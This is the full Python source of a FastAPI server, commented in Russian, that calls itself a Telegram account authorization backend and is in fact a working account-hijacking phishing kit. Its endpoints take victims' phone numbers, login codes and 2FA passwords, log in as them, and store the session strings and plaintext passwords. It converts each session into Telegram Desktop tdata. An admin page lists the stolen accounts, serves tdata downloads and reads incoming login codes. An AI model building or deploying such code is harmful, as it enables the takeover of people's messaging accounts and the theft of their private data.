"""
backend.py — FastAPI сервер для авторизации Telegram аккаунтов
Деплой: amvera.io / любой VPS с Python 3.11+

Зависимости: fastapi uvicorn telethon aiohttp python-dotenv opentele tgcrypto
"""

import os
import json
import uuid
import secrets
import logging
import zipfile
import tempfile
from datetime import datetime
from pathlib import Path
from fastapi import FastAPI, Request, Depends, HTTPException
from fastapi.responses import JSONResponse, FileResponse, HTMLResponse, StreamingResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
    PasswordHashInvalidError,
)
from telethon.sessions import StringSession

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── Config ────────────────────────────────────────────────────
TG_API_ID   = int(os.environ.get("TG_API_ID", "0"))
TG_API_HASH = os.environ.get("TG_API_HASH", "")

ADMIN_LOGIN    = os.environ.get("ADMIN_LOGIN", "admin")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "busyuser_admin_2024")

SESSIONS_DIR = "/data/sessions"
TDATA_DIR    = "/data/tdata"
# ────────────────────────────────────────────────────────────

app = FastAPI()
security = HTTPBasic()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

active_sessions: dict = {}

# ── Статика ──────────────────────────────────────────────────
if os.path.exists("index.html"):
    @app.get("/")
    async def root():
        return FileResponse("index.html")


# ── /send_code ───────────────────────────────────────────────
@app.post("/send_code")
async def send_code(request: Request):
    try:
        body = await request.json()
        phone = body.get("phone", "").strip()
        if not phone:
            return JSONResponse({"ok": False, "error": "Укажите номер телефона."}, status_code=400)

        session_id = str(uuid.uuid4())
        client = TelegramClient(StringSession(), TG_API_ID, TG_API_HASH)
        await client.connect()

        result = await client.send_code_request(phone)
        active_sessions[session_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": result.phone_code_hash,
        }

        logger.info(f"Code sent to {phone}, session={session_id}")
        return JSONResponse({"ok": True, "session_id": session_id})

    except FloodWaitError as e:
        return JSONResponse({"ok": False, "error": f"Слишком много запросов. Подождите {e.seconds} сек."}, status_code=429)
    except Exception as e:
        logger.error(f"send_code error: {e}")
        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)


# ── /verify_code ─────────────────────────────────────────────
@app.post("/verify_code")
async def verify_code(request: Request):
    try:
        body = await request.json()
        phone      = body.get("phone", "").strip()
        code       = body.get("code", "").strip()
        password   = body.get("password", "").strip()
        session_id = body.get("session_id", "").strip()

        sess = active_sessions.get(session_id)
        if not sess:
            return JSONResponse({"ok": False, "error": "Сессия истекла. Запросите код повторно."}, status_code=400)

        client: TelegramClient = sess["client"]
        phone_code_hash = sess["phone_code_hash"]

        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)

        except SessionPasswordNeededError:
            if not password:
                return JSONResponse({"ok": False, "need_password": True, "error": "Требуется пароль 2FA."})
            try:
                await client.sign_in(password=password)
            except PasswordHashInvalidError:
                return JSONResponse({"ok": False, "error": "Неверный пароль 2FA."}, status_code=400)

        except PhoneCodeInvalidError:
            return JSONResponse({"ok": False, "error": "Неверный код. Проверьте и попробуйте ещё раз."}, status_code=400)

        except PhoneCodeExpiredError:
            return JSONResponse({"ok": False, "error": "Код истёк. Запросите новый."}, status_code=400)

        me = await client.get_me()
        session_string = client.session.save()

        logger.info(f"Authorized: {me.id} @{me.username} phone={phone}")

        await save_session(str(me.id), phone, session_string, me.username, me.first_name, password)
        await generate_tdata(str(me.id), session_string)

        active_sessions.pop(session_id, None)

        return JSONResponse({
            "ok": True,
            "user_id": me.id,
            "username": me.username,
            "phone": phone,
        })

    except Exception as e:
        logger.error(f"verify_code error: {e}")
        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)


# ── Сохранение сессии ─────────────────────────────────────────
async def save_session(user_id: str, phone: str, session_string: str,
                       username: str | None, first_name: str | None, password: str = ""):
    os.makedirs(SESSIONS_DIR, exist_ok=True)

    data = {
        "user_id": user_id,
        "phone": phone,
        "username": username or "",
        "first_name": first_name or "",
        "session_string": session_string,
        "password_2fa": password,
        "saved_at": datetime.utcnow().isoformat(),
    }

    path = f"{SESSIONS_DIR}/{user_id}.json"
    with open(path, "w") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

    logger.info(f"Session saved: {path}")


# ── Генерация tdata ───────────────────────────────────────────
async def generate_tdata(user_id: str, session_string: str):
    """Конвертирует StringSession → tdata папку через opentele"""
    try:
        from opentele.td import TDesktop
        from opentele.api import CreateNewSession, UseCurrentSession, API

        os.makedirs(TDATA_DIR, exist_ok=True)
        tdata_path = f"{TDATA_DIR}/{user_id}"
        os.makedirs(tdata_path, exist_ok=True)

        tmp_client = TelegramClient(StringSession(session_string), TG_API_ID, TG_API_HASH)
        await tmp_client.connect()

        try:
            tdesk = await TDesktop.FromTelethon(tmp_client, flag=CreateNewSession, api=API.TelegramDesktop)
        except Exception:
            tdesk = await TDesktop.FromTelethon(tmp_client, flag=UseCurrentSession)

        tdesk.SaveTData(tdata_path)
        await tmp_client.disconnect()
        logger.info(f"tdata saved: {tdata_path}")

    except Exception as e:
        logger.error(f"generate_tdata error for {user_id}: {e}")


# ── Авторизация админа ────────────────────────────────────────
def require_admin(credentials: HTTPBasicCredentials = Depends(security)):
    ok_login = secrets.compare_digest(credentials.username, ADMIN_LOGIN)
    ok_pass  = secrets.compare_digest(credentials.password, ADMIN_PASSWORD)
    if not (ok_login and ok_pass):
        raise HTTPException(
            status_code=401,
            detail="Неверный логин или пароль",
            headers={"WWW-Authenticate": "Basic"},
        )


# ── /admin/tdata/<user_id> — скачать tdata как zip ───────────
@app.get("/admin/tdata/{user_id}")
async def download_tdata(user_id: str, _=Depends(require_admin)):
    tdata_path = Path(f"{TDATA_DIR}/{user_id}")
    if not tdata_path.exists():
        raise HTTPException(status_code=404, detail="tdata не найдена для этого пользователя")

    tmp_zip = tempfile.mktemp(suffix=".zip")
    with zipfile.ZipFile(tmp_zip, "w", zipfile.ZIP_DEFLATED) as zf:
        for file in tdata_path.rglob("*"):
            if file.is_file():
                zf.write(file, arcname=file.relative_to(tdata_path.parent))

    def iter_file():
        with open(tmp_zip, "rb") as f:
            yield from f
        os.remove(tmp_zip)

    return StreamingResponse(
        iter_file(),
        media_type="application/zip",
        headers={"Content-Disposition": f"attachment; filename=tdata_{user_id}.zip"},
    )


# ── /admin/codes/<user_id> — последние коды с +42777 ─────────
@app.get("/admin/codes/{user_id}")
async def get_codes(user_id: str, _=Depends(require_admin)):
    session_path = f"{SESSIONS_DIR}/{user_id}.json"
    if not os.path.exists(session_path):
        raise HTTPException(status_code=404, detail="Сессия не найдена")
    with open(session_path) as f:
        d = json.load(f)
    session_string = d.get("session_string", "")
    if not session_string:
        raise HTTPException(status_code=400, detail="Нет session_string")
    try:
        client = TelegramClient(StringSession(session_string), TG_API_ID, TG_API_HASH)
        await client.connect()
        messages = await client.get_messages("+42777", limit=5)
        codes = []
        for msg in messages:
            codes.append({
                "text": msg.message or "",
                "date": msg.date.isoformat() if msg.date else "",
            })
        await client.disconnect()
        return JSONResponse({"ok": True, "codes": codes})
    except Exception as e:
        logger.error(f"get_codes error for {user_id}: {e}")
        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)



@app.get("/admin", response_class=HTMLResponse)
async def admin_page(_=Depends(require_admin)):
    os.makedirs(SESSIONS_DIR, exist_ok=True)

    sessions_data = []
    for fname in sorted(os.listdir(SESSIONS_DIR)):
        if not fname.endswith(".json"):
            continue
        try:
            with open(f"{SESSIONS_DIR}/{fname}") as f:
                d = json.load(f)
            sessions_data.append(d)
        except Exception:
            continue

    sessions_data.sort(key=lambda x: x.get("saved_at", ""), reverse=True)

    rows = ""
    for d in sessions_data:
        uid   = d.get("user_id", "")
        uname = f"@{d['username']}" if d.get("username") else ""
        fname = d.get("first_name", "") or ""
        twofa = d.get("password_2fa", "")
        twofa_escaped = twofa.replace("'", "\\'")

        tdata_exists = os.path.exists(f"{TDATA_DIR}/{uid}")
        tdata_btn = (
            f'<a class="dl-btn" href="/admin/tdata/{uid}">⬇ Скачать TDATA</a>'
            if tdata_exists
            else '<span class="no-tdata">нет tdata</span>'
        )

        display_name = f"{fname} {uname}".strip() or "—"

        rows += f"""
        <tr>
          <td>
            <div class="account-name">{display_name}</div>
            <div class="account-id">{uid}</div>
            <div class="account-phone">{d.get('phone', '')}</div>
          </td>
          <td class="twofa-cell">
            {f'<span class="twofa-val" onclick="copyStr(\'{twofa_escaped}\')">{twofa} <span class="copy-hint">📋</span></span>' if twofa else '<span class="no-val">—</span>'}
          </td>
          <td>
            <div class="tdata-col">
              {tdata_btn}
              <button class="code-btn" onclick="getCodes('{uid}', this)">📨 Получить код</button>
            </div>
          </td>
        </tr>
        <tr class="codes-row" id="codes-{uid}" style="display:none">
          <td colspan="3">
            <div class="codes-box" id="codes-box-{uid}"></div>
          </td>
        </tr>"""

    count = len(sessions_data)

    html = f"""<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Admin — Busy User</title>
<style>
  *, *::before, *::after {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{
    background: #0a0a0c;
    color: #f1f1f3;
    font-family: 'Segoe UI', system-ui, sans-serif;
    padding: 32px 24px;
    min-height: 100vh;
  }}
  .header {{
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 28px;
    flex-wrap: wrap;
    gap: 12px;
  }}
  .header-left h1 {{ font-size: 22px; font-weight: 700; }}
  .count {{
    display: inline-block;
    background: rgba(99,102,241,0.15);
    border: 1px solid rgba(99,102,241,0.3);
    color: #818cf8;
    padding: 2px 12px;
    border-radius: 20px;
    font-size: 13px;
    margin-left: 10px;
  }}
  .refresh-btn {{
    background: rgba(255,255,255,0.05);
    border: 1px solid rgba(255,255,255,0.1);
    color: #6b6b7a;
    padding: 8px 16px;
    border-radius: 8px;
    cursor: pointer;
    font-size: 13px;
    transition: all 0.15s;
  }}
  .refresh-btn:hover {{ color: #f1f1f3; border-color: rgba(255,255,255,0.2); }}
  .table-wrap {{ overflow-x: auto; }}
  table {{ width: 100%; border-collapse: collapse; font-size: 13px; }}
  th {{
    text-align: left;
    padding: 10px 14px;
    border-bottom: 1px solid rgba(255,255,255,0.07);
    color: #6b6b7a;
    font-weight: 600;
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
  }}
  td {{
    padding: 14px 14px;
    border-bottom: 1px solid rgba(255,255,255,0.04);
    vertical-align: middle;
  }}
  tr:hover td {{ background: rgba(255,255,255,0.02); }}
  .account-name {{ font-size: 14px; font-weight: 500; color: #f1f1f3; }}
  .account-id {{ font-size: 11px; color: #6b6b7a; margin-top: 3px; font-family: monospace; }}
  .account-phone {{ font-size: 12px; color: #818cf8; margin-top: 2px; font-family: monospace; }}
  .tdata-col {{ display: flex; flex-direction: column; gap: 6px; align-items: flex-start; }}
  .code-btn {{
    background: rgba(34,211,165,0.1);
    border: 1px solid rgba(34,211,165,0.3);
    color: #22d3a5;
    padding: 6px 12px;
    border-radius: 8px;
    font-size: 12px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.15s;
    white-space: nowrap;
  }}
  .code-btn:hover {{ background: rgba(34,211,165,0.2); }}
  .code-btn:disabled {{ opacity: 0.5; cursor: default; }}
  .codes-row td {{ padding: 0 14px 14px; }}
  .codes-box {{
    background: rgba(255,255,255,0.03);
    border: 1px solid rgba(255,255,255,0.07);
    border-radius: 10px;
    padding: 12px 16px;
  }}
  .codes-header {{ display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }}
  .codes-title {{ font-size: 12px; color: #6b6b7a; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }}
  .codes-refresh {{ background: none; border: none; color: #6b6b7a; cursor: pointer; font-size: 14px; padding: 2px 6px; border-radius: 4px; transition: color 0.15s; }}
  .codes-refresh:hover {{ color: #f1f1f3; }}
  .code-item {{
    padding: 8px 0;
    border-bottom: 1px solid rgba(255,255,255,0.05);
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
    gap: 12px;
  }}
  .code-item:last-child {{ border-bottom: none; padding-bottom: 0; }}
  .code-text {{ font-family: monospace; font-size: 13px; color: #f1f1f3; line-height: 1.4; flex: 1; }}
  .code-time {{ font-size: 11px; color: #6b6b7a; white-space: nowrap; flex-shrink: 0; margin-top: 2px; }}
  .codes-empty {{ color: #6b6b7a; font-size: 13px; text-align: center; padding: 8px 0; }}
  .codes-error {{ color: #f87171; font-size: 12px; }}
  .twofa-cell {{ font-family: monospace; font-size: 13px; }}
  .twofa-val {{
    cursor: pointer;
    color: #22d3a5;
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 4px 8px;
    border-radius: 6px;
    transition: background 0.15s;
  }}
  .twofa-val:hover {{ background: rgba(34,211,165,0.1); }}
  .copy-hint {{ font-size: 11px; opacity: 0.6; }}
  .no-val {{ color: #3a3a4a; }}
  .dl-btn {{
    display: inline-block;
    background: rgba(99,102,241,0.12);
    border: 1px solid rgba(99,102,241,0.3);
    color: #818cf8;
    padding: 7px 14px;
    border-radius: 8px;
    font-size: 12px;
    font-weight: 600;
    text-decoration: none;
    transition: all 0.15s;
    white-space: nowrap;
  }}
  .dl-btn:hover {{ background: rgba(99,102,241,0.28); color: #a5b4fc; }}
  .no-tdata {{ color: #3a3a4a; font-size: 12px; }}
  .empty {{ text-align: center; color: #6b6b7a; padding: 60px 0; font-size: 14px; }}
  .toast {{
    position: fixed; bottom: 24px; right: 24px;
    background: #22d3a5; color: #0a0a0c;
    padding: 10px 20px; border-radius: 10px;
    font-size: 13px; font-weight: 700;
    opacity: 0; transition: opacity 0.2s;
    pointer-events: none; z-index: 1000;
  }}
  .toast.show {{ opacity: 1; }}
</style>
</head>
<body>
<div class="header">
  <div class="header-left">
    <h1>🗄 Busy User — Аккаунты <span class="count">{count}</span></h1>
  </div>
  <button class="refresh-btn" onclick="location.reload()">↻ Обновить</button>
</div>

<div class="table-wrap">
<table>
  <thead>
    <tr>
      <th>Юзер | Айди</th>
      <th>2FA</th>
      <th>TDATA</th>
    </tr>
  </thead>
  <tbody>
    {"<tr><td colspan='3' class='empty'>Нет сохранённых аккаунтов</td></tr>" if not sessions_data else rows}
  </tbody>
</table>
</div>

<div class="toast" id="toast"></div>

<script>
function copyStr(text) {{
  navigator.clipboard.writeText(text).then(() => {{
    const t = document.getElementById('toast');
    t.textContent = '✅ 2FA скопирован!';
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 2200);
  }});
}}

function timeAgo(isoStr) {{
  const date = new Date(isoStr);
  const now = new Date();
  const diff = Math.floor((now - date) / 1000);
  if (diff < 5) return 'только что';
  if (diff < 60) return diff + ' сек. назад';
  if (diff < 3600) return Math.floor(diff / 60) + ' мин. назад';
  if (diff < 86400) return Math.floor(diff / 3600) + ' ч. назад';
  return Math.floor(diff / 86400) + ' д. назад';
}}

function renderCodes(uid, data) {{
  const box = document.getElementById('codes-box-' + uid);
  if (!data.ok) {{
    box.innerHTML = '<div class="codes-error">❌ ' + (data.error || 'Ошибка') + '</div>';
    return;
  }}
  const codes = data.codes || [];
  let inner = '<div class="codes-header"><span class="codes-title">📨 Коды с +42777</span><button class="codes-refresh" onclick="loadCodes(\'' + uid + '\')" title="Обновить">↻</button></div>';
  if (codes.length === 0) {{
    inner += '<div class="codes-empty">Сообщений нет</div>';
  }} else {{
    codes.forEach(c => {{
      inner += '<div class="code-item"><span class="code-text">' + c.text.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</span><span class="code-time">' + timeAgo(c.date) + '</span></div>';
    }});
  }}
  box.innerHTML = inner;
}}

async function loadCodes(uid) {{
  const box = document.getElementById('codes-box-' + uid);
  box.innerHTML = '<div class="codes-empty">Загрузка...</div>';
  try {{
    const r = await fetch('/admin/codes/' + uid);
    const data = await r.json();
    renderCodes(uid, data);
  }} catch(e) {{
    box.innerHTML = '<div class="codes-error">❌ Ошибка запроса</div>';
  }}
}}

function getCodes(uid, btn) {{
  const row = document.getElementById('codes-' + uid);
  if (row.style.display !== 'none') {{
    row.style.display = 'none';
    return;
  }}
  row.style.display = '';
  loadCodes(uid);
}}
</script>
</body>
</html>"""

    return HTMLResponse(html)


# ── Healthcheck ──────────────────────────────────────────────
@app.get("/health")
async def health():
    return {"ok": True, "sessions_active": len(active_sessions)}


# ── Run ──────────────────────────────────────────────────────
if __name__ == "__main__":
    import uvicorn
    uvicorn.run("backend:app", host="0.0.0.0", port=8000, reload=False)
